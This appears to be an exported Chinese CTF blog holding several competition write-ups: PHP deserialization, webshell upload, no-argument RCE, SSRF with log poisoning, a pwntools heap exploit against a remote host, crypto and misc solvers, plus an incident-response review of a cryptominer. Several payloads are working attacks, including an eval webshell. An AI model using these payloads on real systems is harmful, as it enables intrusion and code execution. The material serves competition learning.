<pre><code>filename={&quot;file&quot;:&quot;index.php&quot;}</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15680951435613.png" alt="img"></p>
<ul>
<li>尝试使用双url编码去绕过<code>stristr</code>均以失败告终，后面去读根目录下的<code>index.php</code>发现源码：</li>
</ul>
<pre><code class="php">&lt;?php
require_once(&#39;hack.php&#39;);
echo &quot;Api!wow&quot;;
function do_unserialize($value){
        preg_match(&#39;/[oc]:\d+:/i&#39;, $value, $matches);
        if (count($matches)) {return false;}
        return unserialize($value);
    }
$x = new hack();
if(isset($_GET[&#39;flag&#39;])) $g = $_GET[&#39;flag&#39;];
if (!empty($g)) {
    $x = do_unserialize($g);
}
echo $x-&gt;readfile();
?&gt;</code></pre>
<ul>
<li>源码可知可以它返序列化了一个类，而这个类在<code>hack.php</code>，于是读取<code>hack.php</code></li>
</ul>
<pre><code class="php">&lt;?php
    class hack {
        public $file;
        function __construct($filename = &#39;&#39;) {
            $this -&gt; file = $filename;
        }

        function readfile() {
            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE
            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
                return @file_get_contents($this-&gt;file);
            }
        }
    }
    //fffffaa_not.php
?&gt;</code></pre>
<ul>
<li>直接可以知，反序列化需要我们去读取<code>fffffaa_not.php</code>(直接读取flag不行，因为不知道flag的文件名)</li>
</ul>
<pre><code class="php">  &lt;?php
  class hack {
      public $file;
      function __construct($filename = &#39;&#39;) {
          $this -&gt; file = $filename;
      }

      function readfile() {
          if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE
          &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
              return @file_get_contents($this-&gt;file);
        }
      }
      }
$a= new hack(&#39;fffffaa_not.php&#39;);
  echo serialize($a);
  //O:4:&quot;hack&quot;:1:{s:4:&quot;file&quot;;s:15:&quot;fffffaa_not.php&quot;;}
  ?&gt;</code></pre>
<ul>
<li>这里又遇到了问题，在hack.php过滤了<code>O:数字</code>,这里直接用加号当做空格绕过。</li>
</ul>
<pre><code>O:+4:&quot;hack&quot;:1:{s:4:&quot;file&quot;;s:15:&quot;fffffaa_not.php&quot;;}</code></pre><ul>
<li>然后读取到<code>fffffaa_not.php</code>源码：</li>
</ul>
<pre><code class="php">&lt;?php
$text = $_GET[&#39;jhh08881111jn&#39;];
$filename = $_GET[&#39;file_na&#39;];
if(preg_match(&#39;[&lt;&gt;?]&#39;, $text)) {
    die(&#39;error!&#39;);
}
if(is_numeric($filename)){
    $path=&quot;/var/www/html/uploads/&quot;.$filename.&quot;.php&quot;;
}else{
    die(&#39;error&#39;);
}
file_put_contents($path, $text);
?&gt;</code></pre>
<ul>
<li><p>这里preg_match()可以直接绕过,使用数组bypass(<a href="https://bugs.php.net/bug.php?id=69274" target="_blank" rel="noopener">Bug #69274</a>)</p>
</li>
<li><p>这样直接构造payload，在uploads文件下生成一个一句话木马。</p>
</li>
</ul>
<pre><code>fffffaa_not.php?jhh08881111jn[]=%3C?php%20@eval($_POST[%27sb%27]);?%3E&amp;file_na=110114</code></pre><ul>
<li>上菜刀在根目录下直接读取flag</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15680963492951.png" alt="img"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="完美的错误"><a href="#完美的错误" class="headerlink" title="完美的错误"></a>完美的错误</h3><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681011438130.png" alt="img"></p>
<p>尝试多次发现base58将表移位</p>
<p>脚本:</p>
<pre><code class="python">import base58

old_base58_table = [&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,

&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;P&#39;,

&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;a&#39;,&#39;b&#39;,

&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,

&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;]

target=&quot;RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX&quot;

s=&quot;&quot;

for i in range(len(old_base58_table)):

    s=&quot;&quot;

    new_base58_table=old_base58_table[:]

    for j in range(len(old_base58_table)):

        new_base58_table[j] = old_base58_table[(j+i)%len(old_base58_table)]

    for k in target:

            s+=old_base58_table[new_base58_table.index(k)]

    if &#39;flag&#39; in base58.b58decode(s):

        print base58.b58decode(s)    </code></pre>
<h3 id="抓灰阔"><a href="#抓灰阔" class="headerlink" title="抓灰阔"></a>抓灰阔</h3><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/1568102716733.png" alt="img"></p>
<p>用wireshark导出http文件发现main(13)与main.jsp%3fpass=281文件有AES的密文密钥</p>
<p>扔去网站解密</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681012317855.png" alt="img"></p>
<p>发现提示，将后面内容复制base64解密转存发现是个ELF文件但是文件头不齐，将文件头补齐后，拉入ida分析</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681013133626.png" alt="img"></p>
<p>将指定字符串输入后得到flag</p>
<pre><code>oo8?989j5i8;jh8&gt;;:=8n;ij:mij8;o4&quot;</code></pre><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681027436525.png" alt="img"><br>题目已经提示了开头的字符，虽然生成了两个随机字符串，但是新生成的字符串是由前一个字符串异或得到，通过开头字符可求得随机字符串key。</p>
<p>脚本:</p>
<pre><code class="python">import os
from Crypto.Util.number import long_to_bytes,bytes_to_long

f=open(&quot;flag.txt.encrypted&quot;, &quot;rb&quot;)
fmessage = f.read()
message=&quot;have a good time.&quot;
key = os.urandom(8)
iv = os.urandom(8)
count = 8
filemessage1= []
filemessage2= []
def decode():
    for i in range(8):
        filemessage1.append(bytes_to_long(fmessage[i*8:i*8+8]))
        filemessage2.append(bytes_to_long(fmessage[i*8:i*8+8]))
    for i in range(7):
            filemessage2[i+1] = filemessage1[i] ^ filemessage2[i+1]
            final=long_to_bytes(filemessage2[1])
    for i in range(8):
        for j in range(255):
            if ord(final[i]) ^ j == ord(message[i+8]):
                key = hex(j)  
    key = &#39;\xf7\x53\xc1\x24\x9c\x49\x73\x18&#39;
    print long_to_bytes(bytes_to_long(key)^filemessage2[2])
    +long_to_bytes(bytes_to_long(key)^filemessage2[3])
    +long_to_bytes(bytes_to_long(key)^filemessage2[4])
    +long_to_bytes(bytes_to_long(key)^filemessage2[5])
    +long_to_bytes(bytes_to_long(key)^filemessage2[6])
decode()</code></pre>
<h3 id="脑筋急转弯"><a href="#脑筋急转弯" class="headerlink" title="脑筋急转弯"></a>脑筋急转弯</h3><p>这题是一道音频隐写的题目，用silenteye提取出文件</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681233241246.png" alt="img"></p>
<p>发现该压缩包有密码，于是用Ziperello破解</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681233775303.png" alt="img"></p>
<p>解压出来是012的文件</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681234098452.png" alt="img"></p>
<p>由该题目的标题联想到brainfuck的语言，于是将0转成  .  将1转成 ! 将2转成?</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681234389077.png" alt="img"></p>
<p>于是用<a href="https://www.splitbrain.org/services/ook在线转换" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook在线转换</a></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681234757302.png" alt="img"></p>
<p><strong>flag{08277716193eda6c592192966e9d6f39}</strong></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h3><p>一开始拿着2.23的libc埋头做，利用条件竞争加上unsorted bin attack改fastbin的最大限制，free的时候所有的chunk都可以进入fastbin，但是改了之后unsorted bin坏了，因为创建进程要0x120的空间，所以就不能用条件竞争改fastbin的fd，那时候想了好久如何绕过这个限制，后来libc换成2.27的时候就容易多了，先free 7个chunk进入tcache将其填满，然后再free进入unsorted bin，利用run函数泄露内存，接着直接用条件竞争该tcache的fd为malloc hook的位置就行了，因为2.27的版本下没有过多的检查，然后将malloc hook改成one_gadget，最后malloc的时候会调用malloc hook的函数，执行one_gadget。</p>
<pre><code>from pwn import*
context.log_level=True
#p=process(&#39;./qw_pwn1&#39;)
p=remote(&#39;119.61.19.212&#39;,8087)
elf=ELF(&#39;qw_pwn1&#39;)
libc=ELF(&#39;libc.so.6&#39;)


def add(id,x):
    p.recvuntil(&#39;3.run\n&#39;)
    p.sendline(&#39;1&#39;)
    p.recvuntil(&#39;index:\n&#39;)
    p.sendline(str(id))
    p.recvuntil(&#39;content:\n&#39;)
    p.send(x)
def add1(id,x):

    p.sendline(&#39;1&#39;)
    p.recvuntil(&#39;index:\n&#39;)
    p.sendline(str(id))
    p.recvuntil(&#39;content:\n&#39;)
    p.send(x)

def free(id):
    p.recvuntil(&#39;3.run\n&#39;)
    p.sendline(&#39;2&#39;)
    p.recvuntil(&#39;index:\n&#39;)
    p.sendline(str(id))
def free1(id):

    p.sendline(&#39;2&#39;)
    p.recvuntil(&#39;index:\n&#39;)
    p.sendline(str(id))    
def run(id,key):
    p.recvuntil(&#39;3.run\n&#39;)
    p.sendline(&#39;3&#39;)
    p.recvuntil(&#39;index:\n&#39;)
    p.sendline(str(id))
    p.recvuntil(&#39;input key:\n&#39;)
    p.sendline(str(key))
add(0,&#39;\0&#39;*0xa0)
add(1,&#39;b&#39;*0x8+p64(0xb1))
add(2,&#39;\0&#39;*0xa0)
add1(3,&#39;\0&#39;*0xa0)
add(4,&#39;\0&#39;*0xa0)
add(5,&#39;\0&#39;*0xa0)
add(6,&#39;\0&#39;*0xa0)
add(7,&#39;\0&#39;*0xa0)
add(8,&#39;\0&#39;*0xa0)
add(9,&#39;\0&#39;*0xa0)

free(1)
free(2)
free(3)
free(4)
free(5)
free(6)
free(7)


free(0)
add(7,&#39;b&#39;*0x8+p64(0xb1))
add(6,&#39;\0&#39;*0xa0)
add1(5,&#39;\0&#39;*0xa0)
add(4,&#39;\0&#39;*0xa0)
add(3,&#39;\0&#39;*0xa0)
add(2,&#39;\0&#39;*0xa0)
add(1,&#39;\0&#39;*0xa0)

add(0,&#39;a&#39;*8)

run(0,0)
p.recvuntil(&#39;a&#39;*8)
libcbase=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-(0x00007ffff7bb0ca0-0x00007ffff77c5000)
print hex(libcbase)

malloc=libcbase+libc.symbols[&#39;__malloc_hook&#39;]
print hex(malloc)
one=libcbase+0x4f322

#malloc=(malloc-0x13) &amp; 0xffff


#key=malloc^(malloc+0x70)
#key=key&amp;0xffff


p.sendline(&#39;3&#39;)
p.recvuntil(&#39;index:\n&#39;)
p.sendline(str(0))

p.recvuntil(&#39;input key:\n&#39;)

p.sendline(str(malloc-0x13))

free(0)
sleep(3)

p.recvuntil(&#39;done\n&#39;)

add1(11,&#39;\0&#39;*0xa0)
add(12,&#39;a&#39;*0x13+p64(one))
#gdb.attach(p)
#raw_input()

p.recvuntil(&#39;3.run\n&#39;)
p.sendline(&#39;1&#39;)
p.recvuntil(&#39;index:\n&#39;)
p.sendline(str(13))
p.interactive()

</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15681235096326.png" alt="img"></p>
<p><strong>flag{85B367076A1B7177F0F2945DA9DFE599}</strong></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>上海大学生联赛部分write up</title>
    <url>//articles/d51d5193e2.html</url>
    <content><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>​        把010编辑器放进010编辑器直接搜索就是了</p>
<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><ul>
<li><p>页面源码提示代码在<code>/code</code>并且flag在这个页面</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727051288542.png" alt="img"></p>
</li>
<li><p>代码和字节跳动的一道boring-code相似,但是过滤得更多</p>
<pre><code class="php"> &lt;?php
highlight_file(__FILE__);
$code = $_GET[&#39;code&#39;];
if (!empty($code)) {
        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
                    echo &#39;bye~&#39;;
                } else {
                    eval($code);
                }
            }
        else {
            echo &quot;No way!!!&quot;;
        }
}else {
        echo &quot;No way!!!&quot;;
    }
No way!!!</code></pre>
</li>
<li><p>在一轮FUZZ之后我们可以得知有下面函数可用。(翻了好久，总共能过这个正则的有300多个函数吧)</p>
<pre><code class="php">echo、implode、scandir、chr、strrev、uniqid、file、chdir、next、pos、end</code></pre>
</li>
<li><p>我们用字节跳动的无参数RCE知道，要读取目录那么就必须构造出<code>scandir(&#39;.&#39;)</code>,一轮无脑翻阅手册后可以知道uniqid()会生成一个唯一的临牌，但是呢，他后半部分是会变化的，那么我们将其翻转过来就能动态构造任意字符如：</p>
<pre><code class="php">&lt;?php
error_reporting(0);
for($i=0;$i&lt;1000;$i++)
echo(chr(strrev(uniqid())));
?&gt;</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727060052967.png" alt="img"></p>
</li>
<li><p>非常明显已经可以构造在不断刷新这个网页在某一时刻就能构造出来点<code>（.）</code>进而读取到目录，而这里正则只允许26个字母构成的函数，所以var_dump这种是不可能使用了，所以这里使用<code>echo、implode</code>将返回的数组变成字符串来读取。那么构造payload如下，使用burpsuite去爆破。</p>
<pre><code class="php">echo(implode(scandir(chr(strrev(uniqid())))));</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727064105621.png" alt="img"></p>
</li>
<li><p>可以看到已经读取了当前目录下的文件列表吗，那么下面就是要读取上层目录下的index.php文件。首先读取一下上层目录的列表，我们从上读取当前目录可以知道返回的文件目录数组如下关系：</p>
<pre><code class="php\">[0=&gt;&#39;.&#39;,1=&gt;&#39;..&#39;,3=&gt;&#39;index.php&#39;]</code></pre>
</li>
<li><p>那么我们要读取上层目录就需要构造<code>scandir(&#39;..&#39;)</code>,那么很明显我们获取第二个元素即可得到两点，构造payload如下：</p>
<pre><code class="php">  echo(implode(scandir(next(scandir(chr(strrev(uniqid())))))));</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727066455027.png" alt="img"></p>
</li>
<li><p>从这里我们可以得知index.php在最后一个元素，那么我们可以使用end()直接获取到，但是要读取到这个文件我们首先需要先跳转到这个目录，那么可以这样构造,使用chdir向上跳转一个目录：</p>
<pre><code class="php">chdir(next(scandir(chr(strrev(uniqid())))))</code></pre>
</li>
<li><p>读取文件呢，我们可以使用第一个payload读取到文件目录，然后使用end()函数去读取最后一个元素，进而读取文件。</p>
<pre><code class="php">file(end(scandir(chr(strrev(uniqid()))))</code></pre>
</li>
<li><p>那么综合起来payload如下：</p>
<pre><code class="php">echo(implode(file(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))))));</code></pre>
</li>
<li><p>但是这里存在一个问题，那就是两次去的值不一定都是点，那么就需要进行N次爆破，在某一时刻这两个值都取到点的时候那么就会读取成功。                                                                                                                                                                                                                                 </p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
</li>
</ul>
<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><ul>
<li><p>开头非常简单的ssrf，直接使用file:///协议即可读到内容</p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);
$x = $_GET[&#39;x&#39;];
$pos = strpos($x,&quot;php&quot;);
if($pos){
        exit(&quot;denied&quot;);
}
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$result = curl_exec($ch);
echo $result; </code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/1572771550497.png" alt="img"></p>
</li>
<li><p>这里直接读flag.php,直接使用双url编码绕过</p>
<pre><code class="php">index.php?x=file:///var/www/html/flag.p%2568p</code></pre>
</li>
</ul>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727716421531.png" alt="img"></p>
<ul>
<li><p>提示/etc/hosts</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719047413.png" alt="img"></p>
</li>
<li><p>发现内网地址，直接爆破内网，发现172.18.0.2返回提示有文件包含漏洞</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719455947.png" alt="img"></p>
</li>
<li><p>扫描这个主机开放的端口</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727720229388.png" alt="img"></p>
</li>
<li><p>发现25端口开放，这里可以联想到结合文件包含，使用 <code>gopherus</code> 污染日志文件从而达到RCE。使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus" target="_blank" rel="noopener"> gopherus </a>生成利用脚本。污染成功后使用文件包含即可rce，日志文件路径：</p>
<pre><code class="php">/var/log/maillog
/var/log/mail.log
/var/adm/maillog
/var/adm/syslog/mail.log</code></pre>
</li>
</ul>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724065385.png" alt="img"></p>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724916990.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯应急响复盘</title>
    <url>//articles/d522b80276.html</url>
    <content><![CDATA[<h2 id="事中应急响应"><a href="#事中应急响应" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><p>对应急响应经验不足错误总结如下：</p>
<p><strong>失误</strong>：</p>
<ul>
<li><p>操作频繁，导致shell命令覆盖，无法朔源黑客执行的哪些操作</p>
</li>
<li><p>web访问频繁，导致web日志存在大量自身ip地址导致审计困难。</p>
</li>
</ul>
<p><strong>正确操作：</strong></p>
<ul>
<li><p>历史命令增加储存为1万条</p>
<pre><code class="shell">sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre>
</li>
<li><p>给历史命令增加登录的IP地址、执行命令时间等信息</p>
<p>在/etc/profile的文件尾部添加如下行数配置信息：</p>
</li>
</ul>
<pre><code class="shell">######jiagu history xianshi#########
USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`
if [ &quot;$USER_IP&quot; = &quot;&quot; ]
then
USER_IP=`hostname`
fi
export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;
shopt -s histappend
export PROMPT_COMMAND=&quot;history -a&quot;
######### jiagu history xianshi ##########</code></pre>
<p>​    让配置生效</p>
<pre><code class="sehll">source /etc/profile

生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</code></pre>
<ul>
<li>开启<code>tcpdump</code>抓取流量到文件，以便使用<code>wireshark</code>分析</li>
</ul>
<h2 id="事中应急响应-1"><a href="#事中应急响应-1" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul>
<li>从日志可以发现，黑客对网站的后台发起了大量登陆尝试</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692531384896.png" alt="img"></p>
<h3 id="系统日志审计"><a href="#系统日志审计" class="headerlink" title="系统日志审计"></a>系统日志审计</h3><ul>
<li><p>系统登陆日志储存在<code>var/log/auth.log</code>或者<code>var/log/secure</code>上。</p>
</li>
<li><p>查看日志成功登陆的IP、用户和时间</p>
</li>
</ul>
<pre><code class="shell">grep &quot;Accepted &quot; auth.log | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></pre>
<ul>
<li>可以看到奇怪的用户名和奇怪的ip。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692542548454.png" alt="img"></p>
<ul>
<li>查看具有root权限的用户</li>
</ul>
<pre><code class="shell">awk -F: &#39;$3==0{print $1}&#39; /etc/passwd
或者
cat /etc/passwd
查看uid=0的用户
</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693222606429.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692545388895.png" alt="img"></p>
<ul>
<li>可以得知存在特权的用户除了root还有mysq1，再查看auth.log日志可以直接看到，该用户是被黑客新添加的，而其登陆ip和第一次登陆时间也可以得知</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692546752738.png" alt="img"></p>
<h3 id="系统进程审查"><a href="#系统进程审查" class="headerlink" title="系统进程审查"></a>系统进程审查</h3><ul>
<li>查看所有进程信息，找到异常的程序名</li>
</ul>
<pre><code class="shell">ps aux</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693224572614.png" alt="img"></p>
<ul>
<li><p>或者使用findshell直接GUI查看进程信息<br><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693225252668.png" alt="img"></p>
</li>
<li><p>找到了一个非常奇怪的进程名</p>
</li>
</ul>
<pre><code class="shell">xmr-stak-cpu</code></pre>
<ul>
<li>直接查看定时任务也可以看到该进程被启用的信息</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693239569853.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/1569323988668.png" alt="img"></p>
<ul>
<li>可以知挖矿病毒绝对路径<code>/etc/xmr-stak-cpu/bin/xmr-stak-cpu</code>,同时<code>bin/config.txt</code>存储了挖矿病毒的配置信息，可以直接得知挖矿病毒的钱包地址。</li>
</ul>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>虎符 CTF 2020 Write up</title>
    <url>//articles/d5702afe7e.html</url>
    <content><![CDATA[<h1 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h1><p><code>/static/js/app.js</code>中有hint提示这个web使用<code>koa-static 来处理静态文件</code></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200420/15873489757041.png" alt="img"></p>
<p>猜测存在koa路由配置错误导致根目录的任意文件读取。我们直接读取app.jpg</p>
<pre><code class="http">http://dafd014be0114c23bd9aa2e1a84d01ea772d377a8e974ab5.changame.ichunqiu.com/app.js</code></pre>
<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
const bodyParser = require(&#39;koa-bodyparser&#39;);
const session = require(&#39;koa-session&#39;);
const static = require(&#39;koa-static&#39;);
const views = require(&#39;koa-views&#39;);

const crypto = require(&#39;crypto&#39;);
const { resolve } = require(&#39;path&#39;);

const rest = require(&#39;./rest&#39;);
const controller = require(&#39;./controller&#39;);

const PORT = 80;
const app = new Koa();

app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
global.secrets = [];

app.use(static(resolve(__dirname, &#39;.&#39;)));

app.use(views(resolve(__dirname, &#39;./views&#39;), {
  extension: &#39;pug&#39;
}));

app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));

// parse request body:
app.use(bodyParser());

// prepare restful service
app.use(rest.restify());

// add controllers:
app.use(controller());

app.listen(PORT);
console.log(`app started at port ${PORT}...`);
</code></pre>
<p>根据代码我们知道还有<code>rest.js</code>和<code>controller.js</code></p>
<pre><code class="javascript">module.exports = {
    APIError: function (code, message) {
        this.code = code || &#39;internal:unknown_error&#39;;
        this.message = message || &#39;&#39;;
    },
    restify: () =&gt; {
        const pathPrefix = &#39;/api/&#39;;
        return async (ctx, next) =&gt; {
            if (ctx.request.path.startsWith(pathPrefix)) {
                ctx.rest = data =&gt; {
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = data;
                };
                try {
                    await next();
                } catch (e) {
                    ctx.response.status = 400;
                    ctx.response.type = &#39;application/json&#39;;
                    ctx.response.body = {
                        code: e.code || &#39;internal_error&#39;,
                        message: e.message || &#39;&#39;
                    };
                }
            } else {
                await next();
            }
        };
    }
};
</code></pre>
<pre><code class="javascript">const fs = require(&#39;fs&#39;);

function addMapping(router, mapping) {
    for (const url in mapping) {
        if (url.startsWith(&#39;GET &#39;)) {
            const path = url.substring(4);
            router.get(path, mapping[url]);
        } else if (url.startsWith(&#39;POST &#39;)) {
            const path = url.substring(5);
            router.post(path, mapping[url]);
        } else {
            console.log(`invalid URL: ${url}`);
        }
    }
}

function addControllers(router, dir) {
    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
        return f.endsWith(&#39;.js&#39;);
    }).forEach(f =&gt; {
        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
        addMapping(router, mapping);
    });
}

module.exports = (dir) =&gt; {
    const controllers_dir = dir || &#39;controllers&#39;;
    const router = require(&#39;koa-router&#39;)();
    addControllers(router, controllers_dir);
    return router.routes();
};
</code></pre>
<p>可以看到<code>controllers</code>应该还还存在<code>api.js</code></p>
<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = {
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || username === &#39;admin&#39;){
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        }

        if(global.secrets.length &gt; 100000) {
            global.secrets = [];
        }

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});

        ctx.rest({
            token: token
        });

        await next();
    },

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
        const {username, password} = ctx.request.body;

        if(!username || !password) {
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        }

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        }

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) {
            ctx.session.username = username;
        }

        ctx.rest({
            status
        });

        await next();
    },

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
        if(ctx.session.username !== &#39;admin&#39;){
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        }

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest({
            flag
        });

        await next();
    },

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
        ctx.session.username = null;
        ctx.rest({
            status: true
        })
        await next();
    }
};
</code></pre>
<p>这道题其实是原题，jwt伪造问题和[AngstromCTF 2019]Cookie Cutter一样。</p>
<p>首先我们来了解一下JWT的构成：</p>
<p>JWT例子：</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJyb2xsZWQiOiJubyIsImlhdCI6MTU4NzM1MTY0MX0.ljkr86K_y88GP8_9RBzxB2H8CBEK73tNdfDQwmT2eaY</code></pre><p>其实它是以点为界分为三部分。</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></pre><pre><code>eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJyb2xsZWQiOiJubyIsImlhdCI6MTU4NzM1MTY0MX0</code></pre><pre><code>ljkr86K_y88GP8_9RBzxB2H8CBEK73tNdfDQwmT2eaY</code></pre><p>第一部分我们成为头部、第二部分我们称为payload,第二部分我们称之为签证。</p>
<ul>
<li>头部构成主要由两部分，typ声明类型，alg声明加密类型，最后base64编码：</li>
</ul>
